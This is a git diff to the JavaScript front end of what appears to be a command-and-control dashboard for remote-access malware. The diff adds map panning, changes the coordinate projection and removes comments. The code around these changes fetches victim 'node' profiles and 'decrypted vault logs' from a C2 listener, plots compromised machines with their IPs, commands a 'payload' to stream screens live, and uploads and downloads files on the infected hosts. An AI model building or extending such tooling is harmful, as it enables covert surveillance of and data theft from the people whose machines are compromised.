@@ -17,7 +17,7 @@ let allNodes = [];
 // --- Live View State ---
 let streamInterval = null;
 let activeStream = { type: null, monitor: 0 };
-const STREAM_POLL_RATE = 250; // FAST POLLING: 4 times a second
+const STREAM_POLL_RATE = 250; 
 
 // --- Filesystem State ---
 let fsPollInterval = null;
@@ -32,9 +32,55 @@ document.addEventListener("DOMContentLoaded", () => {
     switchTab('extraction'); 
     initDragAndDrop();
     initResizers();
+    initMapDrag(); // Initialize Map Panning
     renderNodesList(); 
     renderMap();
 });
+
+// ==========================================
+// MAP DRAG-TO-PAN LOGIC
+// ==========================================
+function initMapDrag() {
+    const mapContainer = document.getElementById('map-container');
+    if(!mapContainer) return;
+
+    let isDraggingMap = false;
+    let startX, startY, scrollLeft, scrollTop;
+
+    mapContainer.addEventListener('mousedown', (e) => {
+        isDraggingMap = true;
+        mapContainer.classList.add('cursor-grabbing');
+        mapContainer.classList.remove('cursor-grab');
+        startX = e.pageX - mapContainer.offsetLeft;
+        startY = e.pageY - mapContainer.offsetTop;
+        scrollLeft = mapContainer.scrollLeft;
+        scrollTop = mapContainer.scrollTop;
+    });
+
+    mapContainer.addEventListener('mouseleave', () => {
+        isDraggingMap = false;
+        mapContainer.classList.remove('cursor-grabbing');
+        mapContainer.classList.add('cursor-grab');
+    });
+
+    mapContainer.addEventListener('mouseup', () => {
+        isDraggingMap = false;
+        mapContainer.classList.remove('cursor-grabbing');
+        mapContainer.classList.add('cursor-grab');
+    });
+
+    mapContainer.addEventListener('mousemove', (e) => {
+        if (!isDraggingMap) return;
+        e.preventDefault();
+        const x = e.pageX - mapContainer.offsetLeft;
+        const y = e.pageY - mapContainer.offsetTop;
+        // The multiplier dictates drag speed
+        const walkX = (x - startX) * 1.5; 
+        const walkY = (y - startY) * 1.5;
+        mapContainer.scrollLeft = scrollLeft - walkX;
+        mapContainer.scrollTop = scrollTop - walkY;
+    });
+}
 
 // ==========================================
 // AUTHENTICATION & FETCHING
@@ -71,7 +117,6 @@ async function fetchData() {
     btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Working';
 
     try {
-        // --- STEP 1: Fetch Node Profile ---
         const nodeResponse = await fetch(`${C2_LISTENER_URL}/node/${deviceId}`, {
             headers: { "X-Dashboard-Password": DASHBOARD_PASSWORD }
         });
@@ -88,14 +133,12 @@ async function fetchData() {
         
         const nodeData = await nodeResponse.json();
         
-        // --- STEP 2: Update UI ---
         activeNodeId = nodeData.id;
         allNodes = [nodeData]; 
         renderNodesList();
         renderMap();
         selectNode(activeNodeId); 
 
-        // --- STEP 3: Fetch Vault Logs ---
         statusMsg.innerHTML = '<i class="fa-solid fa-circle-notch fa-spin text-cyberBlue mr-2"></i>Node found. Decrypting vault logs...';
         const logsResponse = await fetch(`${C2_LISTENER_URL}/logs/${deviceId}`, {
             headers: { "X-Dashboard-Password": DASHBOARD_PASSWORD }
@@ -186,22 +229,14 @@ function renderMap() {
     mapDots.innerHTML = '';
     
     allNodes.forEach(node => {
-        // --- Web Mercator Projection Math ---
-        // This math matches the exact coordinate projection of the CartoDB base map tile.
-        // Even when the container stretches, the percentages stretch perfectly with it.
+        // Linear coordinates for Equirectangular SVG maps
         const x = ((node.lng + 180) / 360) * 100;
-        
-        // Web Mercator only goes up to ~85 degrees lat before tearing, we clamp it to prevent infinity
-        const latClamped = Math.max(-85.0511, Math.min(85.0511, node.lat));
-        const latRad = latClamped * (Math.PI / 180);
-        
-        const mercatorY = Math.log(Math.tan((Math.PI / 4) + (latRad / 2)));
-        const y = (0.5 - (mercatorY / (2 * Math.PI))) * 100;
+        const y = ((90 - node.lat) / 180) * 100;
         
         let dotColor = node.status === 'green' ? 'text-green-500' : (node.status === 'red' ? 'text-red-500' : 'text-yellow-500');
         mapDots.innerHTML += `
             <div class="map-dot ${dotColor}" style="left: ${x}%; top: ${y}%;">
-                <div class="map-tooltip text-[10px] text-left">
+                <div class="map-tooltip text-[10px] text-left pointer-events-none">
                     <div class="font-bold text-white border-b border-gray-700 pb-1 mb-1">${node.id}</div>
                     <div class="text-gray-400">IP: <span class="text-cyberBlue">${node.ip}</span></div>
                     <div class="text-gray-400">OS: <span class="text-white">${node.os}</span></div>
@@ -339,10 +374,7 @@ window.startStream = async function(type, monitorIndex = 0) {
 
     termLog(`Initiating high-speed stream request for ${streamTarget}...`);
     
-    // Command the payload to start continuous background capturing
     await sendCommandToNode(activeNodeId, `START_STREAM:${streamTarget}`);
-    
-    // Begin fetching from the C2 server cache rapidly
     streamInterval = setInterval(fetchFrame, STREAM_POLL_RATE);
 };
 
@@ -366,7 +398,6 @@ async function fetchFrame() {
             imageEl.style.display = 'block';
         }
     } catch (e) {
-        // Ignored. Rapid polling might occasionally fail or overlap.
     }
 }
 
@@ -625,7 +656,6 @@ window.downloadFile = function(fullPath) {
                 if(data.error) {
                     showToast(`Download failed: ${data.error}`, "error");
                 } else if(data.data && data.filename) {
-                    // Convert base64 to downloadable blob
                     const link = document.createElement('a');
                     link.href = 'data:application/octet-stream;base64,' + data.data;
                     link.download = data.filename;
@@ -636,7 +666,6 @@ window.downloadFile = function(fullPath) {
                 }
             }
         } catch(e) { 
-            // Ignored, wait for next poll
         }
     }, 2000);
 };
@@ -665,11 +694,10 @@ document.getElementById('fileUploadInput').onchange = function(e) {
         sendCommandToNode(activeNodeId, `UPLOAD_FILE:${destPath}|${base64Data}`);
         showToast(`Uploading ${file.name}...`);
         
-        // Refresh directory listing shortly after upload
         setTimeout(() => requestDirectoryListing(currentFsPath), 3500);
     };
     reader.readAsDataURL(file);
-    e.target.value = ''; // Reset input
+    e.target.value = ''; 
 };
 
 function updateBreadcrumbs(path) {
